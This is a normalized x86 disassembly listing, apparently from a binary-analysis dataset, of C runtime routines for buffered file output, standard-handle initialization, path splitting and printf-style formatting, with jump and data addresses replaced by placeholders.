push edi
mov eax [ ebp + 0x8 ]
push eax
call sub_450484
add esp 0xc
mov ebx eax
jmp r-xdata
mov eax esi
sub eax edi
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_450758
pop ecx
mov eax ebx
lea ebx [ ebp - 0x208 ]
jmp r-xdata
mov ebx [ ebp - 0x8 ]
sub ebx [ ebp - 0x4 ]
lea edx [ ebp - 0x208 ]
mov ecx ebx
sub ecx edx
cmp ecx 0x1ff
jge r-xdata
lea edx [ ebp - 0x208 ]
mov ecx ebx
sub ecx edx
lea eax [ ebp - 0x208 ]
push ecx
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_450484
add esp 0xc
lea ecx [ ebp - 0x208 ]
sub ebx ecx
cmp eax ebx
je r-xdata
mov eax esi
sub eax edi
cmp eax [ ebp + 0x10 ]
jb r-xdata
add [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jne r-xdata
mov al [ esi ]
inc esi
cmp al 0xa
jne r-xdata
mov ebx [ ebp - 0x8 ]
sub ebx [ ebp - 0x4 ]
add ebx eax
jmp r-xdata
or ebx 0xffffffff
jmp r-xdata
mov [ ebx ] al
inc ebx
inc [ ebp - 0x4 ]
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
jmp r-xdata
sub_450440
push ebx
push esi
push edi
call sub_450fdc
xor edi edi
mov esi [ rw-data ]
mov ebx rw-data
jmp r-xdata
mov eax esi
add esi 0xffffffff
test eax eax
jne r-xdata
test [ ebx + 0x12 ] 0x3
je r-xdata
call sub_450fec
mov eax edi
pop edi
pop esi
pop ebx
retn
add ebx 0x18
cmp [ ebx + 0x8 ] 0x0
je r-xdata
push ebx
call sub_450568
pop ecx
inc edi
sub_450484
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
jb r-xdata
push 0x0
lea edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ eax * 4 + rw-data ]
push eax
call WriteFile
dec eax
je r-xdata
push 0x6
call sub_450a78
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn
call sub_450ae4
pop ecx
pop ebp
retn
sub_4504e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
test [ ebx + 0x12 ] 0x4
je r-xdata
and [ ebx + 0x12 ] 0xfff3
xor edx edx
mov [ ebx + 0xc ] edx
lea ecx [ ebx + 0x14 ]
mov [ ebx + 0x4 ] ecx
mov [ ebx ] ecx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
call sub_44ebe4
pop ecx
xor eax eax
test edi edi
jbe r-xdata
mov [ rw-data ] sub_451b00
test esi esi
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] edi
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
push edi
call sub_44ebd4
pop ecx
mov esi eax
test eax eax
je r-xdata
or [ ebx + 0x12 ] 0x8
or eax 0xffffffff
jmp r-xdata
or [ ebx + 0x12 ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_450568
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
cmp bl [ ebx + 0x17 ]
je r-xdata
call sub_4505f8
xor eax eax
jmp r-xdata
push ebx
call sub_450ffc
cmp [ ebx + 0x8 ] 0x0
pop ecx
jl r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
mov esi [ ebx + 0xc ]
add esi [ ebx + 0x8 ]
inc esi
sub [ ebx + 0x8 ] esi
push esi
mov eax [ ebx + 0x4 ]
mov [ ebx ] eax
push eax
movsx edx [ ebx + 0x16 ]
push edx
call sub_4502f8
add esp 0xc
cmp esi eax
je r-xdata
test [ ebx + 0x12 ] 0x8
jne r-xdata
xor esi esi
test [ ebx + 0x13 ] 0x2
jne r-xdata
xor ecx ecx
mov [ ebx + 0x8 ] ecx
lea eax [ ebx + 0x14 ]
cmp eax [ ebx ]
jne r-xdata
lea edx [ ebx + 0x14 ]
cmp edx [ ebx ]
jne r-xdata
or [ ebx + 0x12 ] 0x10
or esi 0xffffffff
jmp r-xdata
xor esi esi
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ ebx ] edx
push ebx
call sub_4510c4
pop ecx
mov eax esi
sub_4505f8
push ebx
push esi
push edi
push ebp
call sub_450fdc
xor ebp ebp
mov edi [ rw-data ]
mov ebx rw-data
jmp r-xdata
mov ecx edi
add edi 0xffffffff
test ecx ecx
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
jge r-xdata
call sub_450fec
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
add ebx 0x18
mov esi [ ebx + 0xc ]
add esi eax
inc esi
sub [ ebx + 0x8 ] esi
push esi
mov eax [ ebx + 0x4 ]
mov [ ebx ] eax
push eax
movsx edx [ ebx + 0x16 ]
push edx
call sub_4502f8
add esp 0xc
cmp esi eax
je r-xdata
inc ebp
test [ ebx + 0x13 ] 0x2
jne r-xdata
or [ ebx + 0x12 ] 0x10
sub_4506c4
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_450680
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ eax + ebx * 4 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + ebx * 4 ] 0x0
jne r-xdata
mov esi [ rw-data ]
shl esi 0x2
push esi
call sub_44ebd4
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov eax [ ecx + ebx * 4 ]
push eax
call sub_4558c8
pop ecx
pop esi
pop ebx
pop ebp
retn
call sub_4506b4
push rw-data
mov edx ebx
shl edx 0x2
add edx eax
push edx
call sub_455864
add esp 0x8
push esi
push 0x0
mov edx [ rw-data ]
push edx
call sub_44f094
add esp 0xc
push rw-data
call sub_4558e8
pop ecx
sub_450758
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 ]
push ecx
call sub_4558d8
pop ecx
cmp [ rw-data ] 0x0
je r-xdata
push 0xdc
push rw-data
push rw-data
call sub_454374
add esp 0xc
pop ebp
retn
call sub_450690
sub_4507a0
push ebp
mov ebp esp
xor eax eax
mov edx rw-data
jmp r-xdata
cmp eax [ rw-data ]
jl r-xdata
cmp [ edx ] 0x0
je r-xdata
cmp eax [ rw-data ]
jne r-xdata
inc eax
add edx 0x4
mov edx [ ebp + 0xc ]
mov [ eax * 4 + rw-data ] edx
mov ecx [ ebp + 0x8 ]
mov [ eax * 4 + rw-data ] ecx
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
sub_4507e0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov edx [ rw-data ]
cmp edx ecx
jbe r-xdata
xor eax eax
mov edx rw-data
jmp r-xdata
or eax 0xffffffff
pop ebp
retn
cmp edx eax
ja r-xdata
cmp eax [ rw-data ]
jge r-xdata
mov edx [ ecx * 4 + rw-data ]
test edx edx
je r-xdata
cmp [ edx ] 0x0
jne r-xdata
or eax 0xffffffff
pop ebp
retn
cmp [ eax * 4 + rw-data ] 0x0
je r-xdata
inc eax
add edx 0x4
mov [ eax * 4 + rw-data ] edx
mov ecx [ ebp + 0x10 ]
mov [ eax * 4 + rw-data ] ecx
pop ebp
retn
sub_450864
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ rw-data ]
test eax eax
push esi
mov esi [ ebp + 0x8 ]
lea edx [ eax * 4 + rw-data ]
je r-xdata
test esi esi
jne r-xdata
cmp [ edx ] 0x0
jne r-xdata
mov [ esi ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
add esi 0x4
mov [ ebp - 0x8 ] rw-data
cmp eax [ ebp - 0x4 ]
jle r-xdata
test eax eax
jne r-xdata
dec eax
add edx 0xfffffffc
test eax eax
jne r-xdata
shl eax 0x2
push eax
push rw-data
push esi
call sub_44f024
add esp 0xc
xor eax eax
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
test dh 0x8
je r-xdata
lea edx [ eax + eax * 4 ]
add edx 0x4
mov eax edx
jmp r-xdata
xor eax eax
jmp r-xdata
test dh 0x80
jne r-xdata
or cl 0x20
pop esi
pop ecx
pop ecx
pop ebp
retn
test dh 0x20
je r-xdata
or cl 0x80
mov [ esi ] cl
inc esi
inc [ ebp - 0x4 ]
add [ ebp - 0x8 ] 0x4
cmp eax [ ebp - 0x4 ]
jg r-xdata
or cl 0x40
sub_450900
push ebx
push esi
push edi
add esp 0xffffffb4
push rw-data
push rw-data
call sub_455864
add esp 0x8
mov eax [ rw-data ]
push eax
call SetHandleCount
mov ebx eax
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] sub_450864
xor edx edx
mov [ esp + 0x4 ] edx
lea ecx [ esp + 0x8 ]
push ecx
call GetStartupInfoA
movzx eax [ esp + 0x3a ]
mov esi [ esp + 0x3c ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov edx [ esi ]
mov [ esp ] edx
add esi 0x4
mov ecx [ esp ]
lea ecx [ ecx + ecx * 4 ]
add ecx 0x4
cmp ecx eax
jne r-xdata
add esp 0x4c
pop edi
pop esi
pop ebx
retn
push 0xfffffff6
call GetStdHandle
mov [ rw-data ] eax
push 0xfffffff5
call GetStdHandle
mov [ rw-data ] eax
push 0xfffffff4
call GetStdHandle
mov [ rw-data ] eax
xor ebx ebx
mov esi rw-data
mov [ esp + 0x4 ] 0x1
xor ebx ebx
mov edi rw-data
cmp ebx [ esp ]
jge r-xdata
or [ esi ] 0x2000
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ esp ]
lea eax [ ebx * 4 + rw-data ]
jmp r-xdata
mov dl [ esi ]
inc esi
xor eax eax
test dl 0x20
je r-xdata
inc ebx
add esi 0x4
cmp ebx 0x2
jle r-xdata
or [ esi ] 0x10000
jmp r-xdata
and [ esi ] 0xffffdfff
cmp ebx [ rw-data ]
jb r-xdata
test dl 0x40
je r-xdata
or eax 0x800
push ebx
call sub_45022c
pop ecx
test eax eax
jne r-xdata
xor edx edx
inc ebx
mov [ eax ] edx
add eax 0x4
mov ecx [ esp ]
shl ecx 0x2
push ecx
push esi
push rw-data
call sub_44f048
add esp 0xc
test dl 0x80
je r-xdata
or eax 0x2000
or eax 0x8000
or eax 0x4000
jmp r-xdata
mov ecx [ edi ]
inc ebx
and ecx 0x3
or ecx eax
mov [ edi ] ecx
add edi 0x4
cmp ebx [ esp ]
jl r-xdata
sub_450a78
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jl r-xdata
neg ebx
cmp ebx [ rw-data ]
jge r-xdata
cmp ebx 0x12a
jle r-xdata
mov ebx 0x1
call sub_450a6c
mov [ eax ] 0xffffffff
call sub_450a6c
mov [ eax ] ebx
movsx eax [ ebx + rw-data ]
mov ebx eax
jmp r-xdata
call sub_45448c
mov [ eax ] ebx
or eax 0xffffffff
pop ebx
pop ebp
retn
sub_450af8
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov edx [ esi ]
push edx
call sub_44f024
add esp 0xc
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
add [ esi ] ebx
mov ecx [ esi ]
mov [ ecx ] 0x0
sub_450b28
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jb r-xdata
lea edx [ ebp + 0x14 ]
lea ecx [ ebp + 0x8 ]
push edx
push eax
push 0x1
mov eax [ ebp + 0x10 ]
push eax
push ecx
push sub_450af8
call sub_4511c8
add esp 0x18
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
sub_450b58
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jb r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push eax
push 0x1
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push sub_450af8
call sub_4511c8
add esp 0x18
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
sub_450b88
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx 0x1
jb r-xdata
lea eax [ ebp + 0x14 ]
lea ecx [ ebp + 0x8 ]
push eax
push ebx
push 0x1
mov edx [ ebp + 0x10 ]
push edx
push ecx
push sub_450af8
call sub_4511c8
add esp 0x18
cmp ebx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
pop ebx
pop ebp
retn
or eax 0xffffffff
sub_450bc0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx 0x1
jb r-xdata
mov edx [ ebp + 0x14 ]
lea eax [ ebp + 0x8 ]
push edx
push ebx
push 0x1
mov ecx [ ebp + 0x10 ]
push ecx
push eax
push sub_450af8
call sub_4511c8
add esp 0x18
cmp ebx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
pop ebx
pop ebp
retn
or eax 0xffffffff
sub_450bf8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push esi
call sub_44f174
pop ecx
cmp edi eax
ja r-xdata
xor eax eax
push esi
mov edi esi
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi ebx
xchg edi esi
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
push edi
push esi
push ebx
call sub_454280
add esp 0xc
mov [ ebx + edi ] 0x0
jmp r-xdata
sub_450c50
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ ebx - 0x1 ] 0x2e
jne r-xdata
lea edx [ ebx - 0x1 ]
sub edx esi
push edx
push esi
call sub_454250
add esp 0x8
cmp eax 0x2
jne r-xdata
lea eax [ ebx - 0x1 ]
sub eax esi
push eax
push esi
call sub_454250
add esp 0x8
test eax eax
jne r-xdata
dec ebx
mov dl [ ebx ]
sub dl 0x1
jb r-xdata
xor eax eax
jmp r-xdata
dec ebx
mov eax 0x1
jmp r-xdata
sub dl 0x2e
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub dl 0xb
je r-xdata
cmp [ ebx - 0x2 ] 0x0
jne r-xdata
sub dl 0x22
je r-xdata
xor eax eax
jmp r-xdata
sub_450cbc
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
mov [ edx ] 0x0
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx ] 0x0
lea ebx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
push eax
call sub_44f174
pop ecx
mov esi eax
cmp eax 0x104
jle r-xdata
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
push esi
mov eax [ ebp + 0x8 ]
inc ebx
push eax
push ebx
call sub_454280
add esp 0xc
add ebx esi
mov [ ebx ] 0x0
xor esi esi
mov esi 0x104
dec ebx
movsx eax [ ebx ]
cmp eax 0x2f
jg r-xdata
sub ebx 0x2
jmp r-xdata
sub eax 0x3a
je r-xdata
je r-xdata
lea eax [ ebx - 0x1 ]
lea edx [ ebp - 0x107 ]
sub eax edx
push eax
lea ecx [ ebp - 0x107 ]
push ecx
call sub_454250
add esp 0x8
cmp eax 0x2
jne r-xdata
lea edx [ ebp - 0x106 ]
cmp ebx edx
jne r-xdata
sub eax 0x5
je r-xdata
test esi esi
jne r-xdata
sub eax 0x1
jb r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
sub eax 0x1d
je r-xdata
inc esi
inc ebx
cmp [ ebx ] 0x0
je r-xdata
sub eax 0x29
je r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
or edi 0x1
jmp r-xdata
jmp r-xdata
push 0xff
push ebx
mov eax [ ebp + 0x14 ]
push eax
call sub_450bf8
add esp 0xc
mov [ ebx ] 0x0
dec ebx
cmp [ ebx ] 0x0
je r-xdata
or edi 0x4
sub eax 0x4
je r-xdata
push 0xff
push ebx
mov ecx [ ebp + 0x10 ]
push ecx
call sub_450bf8
add esp 0xc
mov [ ebx ] 0x0
dec ebx
jmp r-xdata
or edi 0x8
cmp [ ebx ] 0x3a
jne r-xdata
cmp [ ebx ] 0x3a
jne r-xdata
test esi esi
jne r-xdata
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x107 ] 0x0
je r-xdata
lea edx [ ebp - 0x106 ]
cmp ebx edx
je r-xdata
test esi esi
jne r-xdata
cmp [ ebx + 0x1 ] 0x0
jne r-xdata
push 0x2
lea ecx [ ebp - 0x107 ]
push ecx
mov eax [ ebp + 0xc ]
push eax
call sub_450bf8
add esp 0xc
or edi 0x10
jmp r-xdata
test edi 0x2
jne r-xdata
push ebx
lea edx [ ebp - 0x107 ]
push edx
call sub_450c50
add esp 0x8
mov esi eax
push 0xff
push ebx
mov eax [ ebp + 0x18 ]
or edi 0x2
push eax
call sub_450bf8
add esp 0xc
mov [ ebx ] 0x0
jmp r-xdata
sub_450e9c
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push eax
mov edx [ ebp + 0x14 ]
push edx
mov ecx [ ebp + 0x10 ]
push ecx
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_450cbc
add esp 0x14
pop ebp
retn
sub_450ec0
push ebx
mov ebx rw-data
push rw-data
push rw-data
call sub_455864
add esp 0x8
xor eax eax
lea edx [ ebx + 0x17 ]
mov ecx eax
inc eax
shl ecx 0x3
lea ecx [ ecx + ecx * 2 ]
add ecx ebx
mov [ edx ] cl
add edx 0x18
cmp eax 0x3
jl r-xdata
mov eax 0x3
lea edx [ ebx + 0x5e ]
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
mov [ edx ] 0xff
shl ecx 0x3
inc eax
lea ecx [ ecx + ecx * 2 ]
add ecx ebx
mov [ edx + 0x1 ] cl
add edx 0x18
movsx eax [ ebx + 0x16 ]
test [ eax * 4 + rw-data ] 0x20
jne r-xdata
push 0x200
mov edx 0x1
test [ ebx + 0x13 ] 0x2
jne r-xdata
and [ ebx + 0x12 ] 0xfdff
push edx
push 0x0
push ebx
call sub_4504e8
movsx ecx [ ebx + 0x2e ]
add esp 0x10
test [ ecx * 4 + rw-data ] 0x20
jne r-xdata
dec edx
push 0x200
mov eax 0x2
test [ ebx + 0x2b ] 0x2
jne r-xdata
and [ ebx + 0x2a ] 0xfdff
push eax
push 0x0
lea edx [ ebx + 0x18 ]
push edx
call sub_4504e8
add esp 0x10
pop ebx
retn
add eax 0xfffffffe
sub_450f84
push ebx
mov ebx rw-data
call sub_450fdc
test [ ebx + 0x12 ] 0x4
je r-xdata
test [ ebx + 0x2a ] 0x4
je r-xdata
push ebx
call sub_450568
pop ecx
mov eax [ ebx + 0x4 ]
push eax
call sub_44ebe4
pop ecx
xor edx edx
mov [ ebx + 0xc ] edx
xor ecx ecx
mov [ ebx + 0x8 ] ecx
call sub_450fec
pop ebx
retn
lea eax [ ebx + 0x18 ]
push eax
call sub_450568
pop ecx
mov edx [ ebx + 0x1c ]
push edx
call sub_44ebe4
pop ecx
xor ecx ecx
xor eax eax
mov [ ebx + 0x24 ] ecx
mov [ ebx + 0x20 ] eax
sub_450ffc
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
sub eax rw-data
mov ecx 0x18
cdq
idiv ecx
mov ebx eax
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_450fdc
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ eax + ebx * 4 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + ebx * 4 ] 0x0
jne r-xdata
mov esi [ rw-data ]
shl esi 0x2
push esi
call sub_44ebd4
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov eax [ ecx + ebx * 4 ]
push eax
call sub_4558c8
pop ecx
pop esi
pop ebx
pop ebp
retn
call sub_450fec
push rw-data
mov edx ebx
shl edx 0x2
add edx eax
push edx
call sub_455864
add esp 0x8
push esi
push 0x0
mov edx [ rw-data ]
push edx
call sub_44f094
add esp 0xc
push rw-data
call sub_4558e8
pop ecx
sub_4510c4
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
sub eax rw-data
mov ecx 0x18
cdq
idiv ecx
mov edx [ rw-data ]
mov eax [ edx + eax * 4 ]
push eax
call sub_4558d8
pop ecx
cmp [ rw-data ] 0x0
je r-xdata
push 0x122
push rw-data
push rw-data
call sub_454374
add esp 0xc
pop ebp
retn
call sub_4510a0
sub_451118
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax 0x1
cmp [ ebx + 0x50 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov edx [ ebx + 0x64 ]
test edx edx
je r-xdata
push eax
mov edx [ ebx + 0x58 ]
push edx
mov ecx [ ebx + 0x50 ]
push ecx
push ebx
call [ ebx + 0x54 ]
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ edx ]
cmp ecx [ ebx + 0x5c ]
ja r-xdata
xor eax eax
mov [ ebx + 0x50 ] eax
mov [ ebx + 0x60 ] 0x1
xor eax eax
sub_451160
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx + 0x50 ] 0x50
jl r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
push ebx
call sub_451118
pop ecx
mov ecx [ ebx + 0x50 ]
mov al [ ebp + 0x8 ]
mov [ ebx + ecx ] al
inc [ ebx + 0x50 ]
mov edx [ eax ]
cmp edx [ ebx + 0x5c ]
jbe r-xdata
inc [ ebx + 0x5c ]
pop ebx
pop ebp
retn
sub_451194
push ebp
mov ebp esp
push esi
mov ecx 0x7
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
add eax 0x7
add dl 0x37
mov [ eax ] dl
add dl 0x30
mov [ eax ] dl
jmp r-xdata
mov edx esi
and edx 0xf
cmp edx 0xa
jge r-xdata
pop esi
pop ebp
retn
shr esi 0x4
dec ecx
dec eax
test ecx ecx
jge r-xdata
sub_4511c8
push ebp
mov ebp esp
add esp 0xfffffae0
xor eax eax
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4c0 ] eax
mov [ ebp - 0x4c4 ] eax
mov [ ebp - 0x4d0 ] eax
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4cc ] edx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4c8 ] ecx
cmp [ ebp + 0x14 ] 0x0
je r-xdata
xor eax eax
lea eax [ ebp + 0x18 ]
jmp r-xdata
lea ecx [ ebp - 0x520 ]
push ecx
call sub_451118
cmp [ ebp - 0x4c0 ] 0x0
pop ecx
je r-xdata
cmp bl 0x25
jne r-xdata
mov [ ebp - 0x4bc ] eax
mov eax [ ebp - 0x4c4 ]
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov al bl
test [ eax + rw-data ] 0x4
je r-xdata
mov bl [ esi ]
cmp bl 0x25
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x520 ]
push eax
push ebx
call sub_451160
add esp 0x8
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
lea edx [ esi - 0x1 ]
xor eax eax
mov [ ebp - 0x14 ] edx
xor edx edx
mov [ ebp - 0x10 ] edx
or edx 0xffffffff
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] edx
xor ecx ecx
mov edi 0x20
mov [ ebp - 0x1c ] ecx
inc esi
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
lea edx [ ebp - 0x520 ]
push edx
push ebx
call sub_451160
add esp 0x8
mov bl [ esi ]
inc esi
mov eax [ ebp - 0x14 ]
inc [ ebp - 0x14 ]
mov al [ eax ]
test al al
jne r-xdata
movsx edx bl
cmp edx 0x7f
jg r-xdata
lea edx [ ebp - 0x520 ]
push edx
push eax
call sub_451160
add esp 0x8
mov ecx ebx
add cl 0xe0
xor edx edx
mov dl cl
xor ecx ecx
mov cl [ edx + rw-data ]
cmp ecx 0x1a
ja r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
jl r-xdata
jmp [ ecx * 4 + jump_table_4512b8 ]
test eax eax
jg r-xdata
test eax eax
jg r-xdata
test eax eax
jg r-xdata
and edi 0xffffffdf
mov eax 0x5
jmp r-xdata
or edi 0x20
mov eax 0x5
jmp r-xdata
test eax eax
jg r-xdata
add [ ebp + 0x1c ] 0x4
mov edx [ ebp + 0x1c ]
cmp eax 0x2
mov ecx [ edx - 0x4 ]
mov [ ebp - 0x30 ] ecx
jge r-xdata
cmp eax 0x4
jge r-xdata
add bl 0xd0
cmp eax 0x2
jg r-xdata
or edi 0x10
mov eax 0x5
jmp r-xdata
or edi 0x100
mov eax 0x5
and edi 0xffffffef
jmp r-xdata
or edi 0x200
mov eax 0x5
and edi 0xffffffef
jmp r-xdata
cmp [ esi ] 0x36
jne r-xdata
mov [ ebp - 0x38 ] 0x8
jmp r-xdata
mov [ ebp - 0x38 ] 0xa
jmp r-xdata
mov [ ebp - 0x38 ] 0x10
lea edx [ ebx - 0x17 ]
mov [ ebp - 0x1d ] dl
mov [ ebp - 0x38 ] 0xa
mov cl 0x1
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
lea ecx [ ebp - 0xb8 ]
mov edx [ eax - 0x4 ]
mov [ ebp - 0x18 ] edx
push ecx
mov eax [ ebp - 0x18 ]
push eax
call sub_451194
add esp 0x8
mov [ ebp - 0xb0 ] 0x0
and edi 0xfffffffb
lea edx [ ebp - 0xb8 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
test edi 0x210
jne r-xdata
test edi 0x10
je r-xdata
test edi 0x210
jne r-xdata
test edi 0x10
je r-xdata
test edi 0x100
mov eax 0x8
jne r-xdata
add [ ebp + 0x1c ] 0x4
mov edx [ ebp + 0x1c ]
test edi 0x10
mov ecx [ edx - 0x4 ]
mov [ ebp - 0x18 ] ecx
je r-xdata
or edi 0x1
jmp r-xdata
or edi 0x2
jmp r-xdata
cmp [ ebp - 0x9 ] 0x2b
je r-xdata
test edi 0x2
jne r-xdata
cmp eax 0x4
jne r-xdata
cmp [ ebp - 0x30 ] 0x0
jge r-xdata
mov eax 0x4
inc [ ebp - 0x8 ]
jmp r-xdata
cmp eax 0x4
jne r-xdata
cmp [ ebp - 0x4 ] 0xffffffff
mov eax 0x2
jne r-xdata
cmp [ esi ] 0x33
jne r-xdata
cmp [ esi + 0x1 ] 0x34
jne r-xdata
mov [ ebp - 0x9 ] 0x0
xor ecx ecx
jmp r-xdata
test edi 0x100
je r-xdata
test edi 0x10
je r-xdata
add [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x1c ]
mov edx [ eax - 0x8 ]
mov [ ebp - 0x28 ] edx
mov edx [ eax - 0x4 ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
test edi 0x8
je r-xdata
or edi 0x10
add [ ebp + 0x1c ] 0x4
mov ecx [ ebp + 0x1c ]
lea edx [ ebp - 0xb8 ]
mov al [ ecx - 0x4 ]
xor ecx ecx
mov [ ebp - 0xb8 ] al
mov [ ebp - 0xb7 ] 0x0
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x40 ] 0x1
jmp r-xdata
add [ ebp + 0x1c ] 0x4
mov ecx [ ebp + 0x1c ]
lea edx [ ebp - 0xb8 ]
mov ax [ ecx - 0x4 ]
mov [ ebp - 0xb8 ] ax
mov [ ebp - 0xb6 ] 0x0
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x40 ] 0x1
jmp r-xdata
or edi 0x10
add [ ebp + 0x1c ] 0x4
mov ecx [ ebp + 0x1c ]
xor edx edx
mov eax [ ecx - 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] edx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
mov edx [ eax - 0x4 ]
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] 0x1
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov edx edi
push eax
and dl 0x1
